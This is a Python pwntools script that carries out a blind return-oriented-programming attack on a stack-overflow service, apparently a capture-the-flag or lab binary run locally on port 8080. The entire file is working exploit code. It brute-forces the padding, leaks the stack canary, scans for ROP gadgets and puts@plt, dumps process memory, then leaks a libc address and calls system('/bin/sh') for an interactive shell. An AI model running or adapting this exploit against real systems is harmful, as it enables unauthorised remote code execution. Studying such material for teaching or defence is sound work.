from pwn import *
import sys
import binascii

#context.log_level = 'debug'
context.arch = 'amd64'



def get_shell():
	return remote("0.0.0.0", 8080)


def Padding_config():
	padding_length = 1

	while 1:
		try:
			p = get_shell()
			p.recvline()
			p.send("a" * padding_length)
			p.recvline()
			p.recvline()
			all = p.recvall()
			if "login" in all:
				print "Padding More..."
				padding_length += 1
			elif len(all) == 0:
				print "Success!!! padding Length: {}".format(padding_length - 1)
				break

		except:
			print "Success!!! padding Length: {}".format(padding_length - 1)
			break
		p.close()
	return padding_length

# need close
# -fno-stack-protector
def Leak_canary():
	padding_length = 136

	p = get_shell()
	p.recvline()
	padding = 'a'*(padding_length) + 'w'
	p.send(padding)
	p.recvline()

	p.recvuntil('w')
	canary = p.recv(7)
	canary = u64(canary.ljust(8, '\x00')) << 8
	
	print("canary: ", hex(canary))

	p.close()
	return canary


def Leak_Base_addr():
	padding_length = 136
	try:
		p = get_shell()
		p.recvline()
		p.send('a' * (padding_length - 1) + 'w')
		p.recvuntil('w')
		retAddr = u64(p.recvline().strip('\n').ljust(8, '\x00'))
		print("Return Address: ", hex(retAddr))
		p.close()
	except:
		pass
	# 0x40067e
	pass

def Find_stop_gadget():
	padding_length = 136
	#x64 base addr
	start_addr = 0x400000

	while 1:
		try:
			p = get_shell()
			p.recvline()

			payload = 'a' * (padding_length - 1) + 'w'
			payload += p64(start_addr)
			p.send(payload)

			p.recvuntil('w')
			p.recvline()
			all = p.recvall(timeout=2)
			if 'Please' in all:
				print("Success!!! start_addr: 0x%x" % start_addr)
				break
			else:
				print("Wrong: 0x%x" %  start_addr)
				start_addr += 1
		except:
				print("Wrong: 0x%x" %  start_addr)
				start_addr += 1
		p.close()
	# 0x400570
	pass

def Find_Csu_init_gadget():
	padding_length = 136
	start_addr = 0x400570

	#	csu_init is behind start
	csu_init = start_addr + 0x200

	while 1:
		try:
			p = get_shell()
			p.recvline()

			payload = 'a' * (padding_length - 1) + 'w'
			payload += p64(csu_init) + p64(0xdeadbeef)*6 + p64(start_addr)
			p.send(payload)

			p.recvuntil('w')
			p.recvline()
			all = p.recvall(timeout=2)
			if ('Please' in all) and (check_csu_init(csu_init)):
				print("Success!!! csu_init_gadget: 0x%x" % csu_init)
				break
			else:
				print("Wrong: 0x%x" %  csu_init)
				csu_init += 1
		except:
				print("Wrong: 0x%x" %  csu_init)
				csu_init += 1
		p.close()
	# 0x40078a
	pass	

def check_csu_init(csu_init):
	try:
		p = get_shell()
		p.recvline()

		payload = 'a' * (padding_length - 1) + 'w'
		payload += p64(csu_init) + p64(0xdeadbeef) * 10			#more than 6
		p.send(payload)

		p.recvuntil('w')
		p.recvline()
		all = p.recvall(timeout=2)
		p.close()
		return False			#start | main
	except:
		p.close()
		return True			#pop pop

def Find_Puts_plt():
	padding_length = 136

	puts_addr = 0x400500
	#x64 base addr
	csu_init = 0x40078a
	pop_rdi = csu_init + 9			#pop rdi ; ret

	while 1:
		try:
			p = get_shell()
			p.recvline()

			payload = 'a' * (padding_length - 1) + 'w'
			payload += p64(pop_rdi) + p64(0x400000) + p64(puts_addr)

			p.send(payload)

			p.recvuntil('w')
			p.recvline()
			all = p.recvall(timeout = 2)
			if 'ELF' in all:
				print("Success!!! puts@plt: 0x%x" % puts_addr)
				break
			else:
				print("Wrong: 0x%x" %  puts_addr)
				puts_addr += 1
		except:
			pass
		p.close()

	#puts_plt = 0x400515
	pass		

'''
.text:0000000000400870                 mov     rdx, r13
.text:0000000000400873                 mov     rsi, r14
.text:0000000000400876                 mov     edi, r15d
.text:0000000000400879                 call    qword ptr [r12+rbx*8]


.text:000000000040088A                 pop     rbx
.text:000000000040088B                 pop     rbp
.text:000000000040088C                 pop     r12
.text:000000000040088E                 pop     r13
.text:0000000000400890                 pop     r14
.text:0000000000400892                 pop     r15
.text:0000000000400894                 retn
'''

def leak(pop_rdi, dump_addr, puts_addr):

	padding_length = 136
	try:
		p = get_shell()
		p.recvline()

		payload = 'a' * (padding_length - 1) + 'w'
		payload += p64(pop_rdi) + p64(dump_addr) + p64(puts_addr)

		p.send(payload)
		p.recvuntil('w')
		p.recvline()

		data = p.recvline().strip('\n')
		p.close()
		if data == "":
			data = '\x00'
	except:
		print("exception")
		data = None
	return data

def dumpProcess():
	dump_addr = 0x400000
	dump_length = 0

	padding_length = 136
	#x64 base addr
	csu_init = 0x40078a
	pop_rdi = csu_init + 9			#pop rdi ; ret
	puts_addr = 0x400515

	while dump_length < 0x1000:
		data = leak(pop_rdi, dump_addr + dump_length, puts_addr)
		if data == None:
			continue
		else:
			dump_length += len(data)
			print("addr: 0x%x", hex(dump_length + dump_addr))
		
		with open("dump", 'ab') as fp:
			fp.write(data)
	pass	

def exploit():
	padding_length = 136
	start_addr = 0x400570
	#x64 base addr
	csu_init = 0x40078a
	pop_rdi = csu_init + 9			#pop rdi ; ret
	puts_addr = 0x400515	
	puts_got = 0x601018

	puts_offset = 0x6f690
	system_offset = 0x45390
	binsh_offset = 0x18cd57
	try:
		p = get_shell()
		p.recvline()

		#leak libc
		payload = 'a' * (padding_length - 1) + 'w'
		payload += p64(pop_rdi) + p64(puts_got) + p64(puts_addr) + p64(start_addr)

		p.send(payload)
		p.recvuntil('w')
		p.recvline()

		line = p.recvuntil("\nPlease", drop=True)
		puts_libc = u64(line.ljust(8, '\x00'))
		print("puts_libc: ", hex(puts_libc))

		libc_addr = puts_libc - puts_offset 
		system_libc = libc_addr + system_offset
		binsh_libc = libc_addr + binsh_offset 

		print("system: ", hex(system_libc))
		payload = 'a' * (padding_length - 1) + 'w'
		payload += p64(pop_rdi) + p64(binsh_libc) + p64(system_libc)
		p.send(payload)

		p.recvuntil('w')
		p.recvline()

		p.interactive()
		p.close()

	except:
		pass


# socat tcp-l:8080,fork exec:./rdw,reuseaddr
if __name__ == '__main__':
	#Padding_config()
	#Leak_Base_addr()
	#Find_stop_gadget()
	#Find_Csu_init_gadget()
	#Find_Puts_plt()
	#dumpProcess()
	exploit()